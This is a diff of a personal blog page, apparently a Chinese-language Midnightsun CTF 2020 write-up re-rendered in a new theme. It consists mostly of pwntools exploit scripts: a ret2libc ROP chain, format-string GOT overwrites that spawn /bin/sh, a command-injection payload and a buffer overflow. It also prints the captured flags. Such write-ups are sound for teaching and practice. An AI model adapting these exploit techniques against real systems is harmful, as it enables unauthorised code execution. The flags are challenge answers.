@@ -1,168 +1,34 @@
-<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>Midnightsun CTF 2020 | Nop</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop" type="application/atom+xml">
-</head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">Nop</a></h1></div><p class="m-desc">There is a long way to go</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">Archives</a></li><li><span class="dot">●</span><a href="/categories/">Categories</a></li><li><span class="dot">●</span><a href="/tags/">Tags</a></li><li><span class="dot">●</span><a href="/about/">About</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="Search" onfocus="if(this.value=='Search'){this.value='';}" onblur="if(this.value==''){this.value='Search';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">Midnightsun CTF 2020</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/04/05/Midnightsun-CTF-2020/">2020-04-05</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/Writeup/">Writeup</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>只会做简单的，re没去做，做pwn去了。</p>
-<blockquote>
-<p>pwn1</p>
-</blockquote>
-<pre><code class="python">offset = 0x48
-pop_rdi = 0x0000000000400783 # pop rdi ; ret
-pop_rsi = 0x0000000000400781 # pop rsi ; pop r15 ; ret
-main = 0x0000000000400698
-puts_plt = elf.plt[&quot;puts&quot;]
-puts_got = elf.got[&quot;puts&quot;]
-puts_offset = libc.symbols[&quot;puts&quot;]
-system_offset = libc.symbols[&quot;system&quot;]
-str_bin_sh_offset = libc.search(&quot;/bin/sh&quot;).next()
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Midnightsun CTF 2020"><meta name="keywords" content="Midnightsun 2020,pwn"><meta name="author" content="Nop"><meta name="copyright" content="Nop"><title>Midnightsun CTF 2020 | Nop's BLog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop's BLog" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn1"><span class="toc-number">1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn2"><span class="toc-number">2.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn4"><span class="toc-number">3.</span> <span class="toc-text">pwn4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#admpanel"><span class="toc-number">4.</span> <span class="toc-text">admpanel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#admpanel2"><span class="toc-number">5.</span> <span class="toc-text">admpanel2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Nop</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">9</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">4</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">3</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/avatar.png# false or url of img)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Nop's BLog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/atom.xml">RSS</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">Midnightsun CTF 2020</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-05</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">472</span><span class="post-meta__separator">|</span><span>Reading time: 2 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>只会做简单的，re没去做，做pwn去了。</p>
+<a id="more"></a>
 
-p.recvuntil(&quot;buffer: &quot;)
-
-payload = &quot;A&quot; * offset
-payload += flat([pop_rdi, puts_got, puts_plt, main])
-p.sendline(payload)
-
-libc_puts = u64(p.recv(6).ljust(8, &quot;\x00&quot;))
-libc_base = libc_puts - puts_offset
-libc_system = libc_base + system_offset
-str_bin_sh = libc_base + str_bin_sh_offset
-
-payload = &quot;A&quot; * offset
-payload += flat([pop_rsi, 0, 0, pop_rdi, str_bin_sh, libc_system])
-p.sendline(payload)
-
-success(&quot;libc_base: &quot; + hex(libc_base))
-success(&quot;libc_system: &quot; + hex(libc_system))
-success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))
-
-p.interactive()</code></pre>
+<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x48</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400781</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">main = <span class="number">0x0000000000400698</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_offset = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"buffer: "</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * offset</span><br><span class="line">payload += flat([pop_rdi, puts_got, puts_plt, main])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = libc_puts - puts_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * offset</span><br><span class="line">payload += flat([pop_rsi, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, str_bin_sh, libc_system])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p><code>midnight{the_pwnshank_redemption_d2b4205bea4b8eeb}</code></p>
-<blockquote>
-<p>pwn2</p>
-</blockquote>
-<pre><code class="python">def format_str(offset, addr_value_pairs, size, info=&quot;&quot;):
-    payload = &quot;&quot;
-    length = 0
-
-    for item in addr_value_pairs:
-        for i in range(size):
-            payload += p32(item[0] + i)
-
-    length = len(payload)
-
-    for item in addr_value_pairs:
-        temp = item[1]
-        for i in range(size):
-            value = ((temp &amp; 0xFF) + 0x100 - length) &amp; 0xFF
-            if value == 0:
-                value = 0x100
-            payload += &quot;%&quot; + str(value) + &quot;c%&quot; + str(offset) + &quot;$hhn&quot;
-            length = temp &amp; 0xFF
-            temp &gt;&gt;= 8
-            offset += 1
-
-    payload += info
-
-    return payload
-
-context.log_level = &quot;debug&quot;
-
-offset = 7
-_exit = elf.got[&quot;exit&quot;]
-target_addr = 0x08048672
-printf_got = elf.got[&quot;printf&quot;]
-main = 0x080485EB
-__libc_start_main_ret_offset = libc.symbols[&quot;__libc_start_main&quot;] + 241
-system_offset = libc.symbols[&quot;system&quot;]
-str_bin_sh_offset = libc.search(&quot;/bin/sh&quot;).next()
-
-payload = format_str(offset, [[_exit, main]], 2, &quot;addr:%27$p&quot;)
-p.sendlineafter(&quot;input: &quot;, payload)
-
-p.recvuntil(&quot;addr:0x&quot;)
-__libc_start_main_ret = int(p.recv(8), 16)
-libc_base = __libc_start_main_ret - __libc_start_main_ret_offset
-libc_system = libc_base + system_offset
-
-payload = format_str(offset, [[printf_got, libc_system]], 4)
-p.sendline(payload)
-
-payload = &quot;/bin/sh\x00&quot;
-p.sendlineafter(&quot;input: &quot;, payload)
-
-success(&quot;libc_base: &quot; + hex(libc_base))
-success(&quot;libc_system: &quot; + hex(libc_system))
-
-p.interactive()</code></pre>
+<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_str</span><span class="params">(offset, addr_value_pairs, size, info=<span class="string">""</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> addr_value_pairs:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            payload += p32(item[<span class="number">0</span>] + i)</span><br><span class="line">    </span><br><span class="line">    length = len(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> addr_value_pairs:</span><br><span class="line">        temp = item[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            value = ((temp &amp; <span class="number">0xFF</span>) + <span class="number">0x100</span> - length) &amp; <span class="number">0xFF</span></span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">                value = <span class="number">0x100</span></span><br><span class="line">            payload += <span class="string">"%"</span> + str(value) + <span class="string">"c%"</span> + str(offset) + <span class="string">"$hhn"</span></span><br><span class="line">            length = temp &amp; <span class="number">0xFF</span></span><br><span class="line">            temp &gt;&gt;= <span class="number">8</span></span><br><span class="line">            offset += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    payload += info</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line">_exit = elf.got[<span class="string">"exit"</span>]</span><br><span class="line">target_addr = <span class="number">0x08048672</span></span><br><span class="line">printf_got = elf.got[<span class="string">"printf"</span>]</span><br><span class="line">main = <span class="number">0x080485EB</span></span><br><span class="line">__libc_start_main_ret_offset = libc.symbols[<span class="string">"__libc_start_main"</span>] + <span class="number">241</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = format_str(offset, [[_exit, main]], <span class="number">2</span>, <span class="string">"addr:%27$p"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:0x"</span>)</span><br><span class="line">__libc_start_main_ret = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = __libc_start_main_ret - __libc_start_main_ret_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">payload = format_str(offset, [[printf_got, libc_system]], <span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">p.sendlineafter(<span class="string">"input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p><code>midnight{the_pwnfather_0ff771d2eccc36b8}</code></p>
-<blockquote>
-<p>pwn4</p>
-</blockquote>
-<p>没做出来，知识盲区：</p>
-<pre><code class="C">printf(&quot;%2$*25$d%16$n&quot;);</code></pre>
+<h1 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h1><p>没做出来，知识盲区：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%2$*25$d%16$n"</span>);</span><br></pre></td></tr></table></figure>
 <p>输出第25个参数，并根据第2个参数宽度对齐。<br><br>没尝试打远程了，输出太长了，反正比赛结束了，直接打本地了。</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">gdb.attach(p, <span class="string">"b fprintf"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%2$*25$d%16$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"5536"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-# context.log_level = &quot;debug&quot;
-
-p = process(&quot;./pwn4&quot;)
-gdb.attach(p, &quot;b fprintf&quot;)
-
-payload = &quot;%2$*25$d%16$n&quot;
-p.sendline(payload)
-p.sendline(&quot;5536&quot;)
-
-p.interactive()</code></pre>
-<blockquote>
-<p>admpanel</p>
-</blockquote>
-<pre><code class="python">def auth(name, passwd):
-    p.sendlineafter(&quot; &gt; &quot;, &quot;1&quot;)
-    p.sendafter(&quot;  Input username: &quot;, name)
-    p.sendafter(&quot;  Input password: &quot;, passwd)
-
-def execute(comm):
-    p.sendlineafter(&quot; &gt; &quot;, &quot;2&quot;)
-    p.sendafter(&quot;  Command to execute: &quot;, comm)
-
-auth(&quot;admin\n&quot;, &quot;password\n&quot;)
-execute(&quot;id;/bin/sh\x00\n&quot;)
-
-p.interactive()</code></pre>
+<h1 id="admpanel"><a href="#admpanel" class="headerlink" title="admpanel"></a>admpanel</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(name, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Input username: "</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"  Input password: "</span>, passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(comm)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Command to execute: "</span>, comm)</span><br><span class="line"></span><br><span class="line">auth(<span class="string">"admin\n"</span>, <span class="string">"password\n"</span>)</span><br><span class="line">execute(<span class="string">"id;/bin/sh\x00\n"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p><code>midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}</code></p>
-<blockquote>
-<p>admpanel2</p>
-</blockquote>
-<pre><code class="python">context.log_level = &#39;debug&#39;
-
-def auth(name, passwd):
-    p.sendlineafter(&quot; &gt; &quot;, &quot;1&quot;)
-    p.sendafter(&quot;  Input username: &quot;, name)
-    p.sendafter(&quot;  Input password: &quot;, passwd)
-
-def execute(comm):
-    p.sendlineafter(&quot; &gt; &quot;, &quot;2&quot;)
-    p.sendafter(&quot;  Command to execute: &quot;, comm)
-
-target_addr = 0x0000000000401598
-
-name = &quot;admin;/bin/sh;&quot;.ljust(0x3FE, &quot;A&quot;) + &#39;\n&#39;
-auth(name, &quot;password\n&quot;)
-
-comm = &quot;B&quot; * 0x10c + p64(target_addr) + &quot;\n&quot;
-execute(comm)
-
-p.interactive()
-
-#flag: midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}</code></pre>
+<h1 id="admpanel2"><a href="#admpanel2" class="headerlink" title="admpanel2"></a>admpanel2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(name, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Input username: "</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"  Input password: "</span>, passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(comm)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" &gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"  Command to execute: "</span>, comm)</span><br><span class="line"></span><br><span class="line">target_addr = <span class="number">0x0000000000401598</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">"admin;/bin/sh;"</span>.ljust(<span class="number">0x3FE</span>, <span class="string">"A"</span>) + <span class="string">'\n'</span></span><br><span class="line">auth(name, <span class="string">"password\n"</span>)</span><br><span class="line"></span><br><span class="line">comm = <span class="string">"B"</span> * <span class="number">0x10c</span> + p64(target_addr) + <span class="string">"\n"</span></span><br><span class="line">execute(comm)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag: midnight&#123;n3ver_4sk_hsp3_t0_do_s0m3th1ng&#125;</span></span><br></pre></td></tr></table></figure>
 <p><code>midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}</code></p>
-<blockquote>
-<p>参考</p>
-</blockquote>
-<ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
 <li><a href="http://blog.redrocket.club/2018/06/21/midnightsunctf-finals-2018-glitch/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://blog.redrocket.club/2018/06/21/midnightsunctf-finals-2018-glitch/?tdsourcetag=s_pctim_aiomsg</a></li>
 </ol>
-</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">Nop</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/04/05/Midnightsun-CTF-2020/">http://n0nop.com/2020/04/05/Midnightsun-CTF-2020/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://n0nop.com">Nop的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CTF/">CTF</a><a href="/tags/pwn/">pwn</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2020/03/31/VolgaCTF-2020/">VolgaCTF 2020 &gt;</a></div></section><footer><p>Copyright © 2016 - 2020 <a href="/." rel="nofollow">Nop</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
-if (search_path.length == 0) {
-    search_path = 'search.xml';
-}
-var path = '/' + search_path;
-searchFunc(path, 'local-search-input', 'local-search-result');
-</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Nop</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://n0nop.com/2020/04/05/Midnightsun-CTF-2020/">https://n0nop.com/2020/04/05/Midnightsun-CTF-2020/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/03/31/VolgaCTF-2020/"><span>VolgaCTF 2020</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/avatar.png# false or url of img)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By Nop</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
